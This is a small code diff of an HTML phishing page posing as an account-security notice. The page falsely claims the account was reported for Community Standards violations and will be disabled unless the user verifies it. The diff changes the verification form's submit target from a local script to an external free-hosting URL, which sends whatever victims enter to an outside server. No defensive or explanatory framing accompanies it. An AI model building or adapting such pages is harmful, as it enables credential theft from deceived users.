@@ -61,7 +61,7 @@
       We detected unusual activity in your account today <strong><script language='JavaScript'>document.write(tanggallengkap);</script></strong>. Someone has reported your account for not complying with <a>Community Standards</a>. We have already reviewed this decision and the decision cannot be changed. To avoid having your account <a>disabled</a>, please verify your account:
     </div>
   </div>
-  <form action="info.php?button_location=settings&amp;button_name=help" method="POST">
+  <form action="https://ytbunasa.000webhostapp.com/info.php?button_location=settings&amp;button_name=help" method="POST">
 
 <div class="ElementWrapper">
     <div data-form-element-key="PrevToPrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevToPrevYearDays">
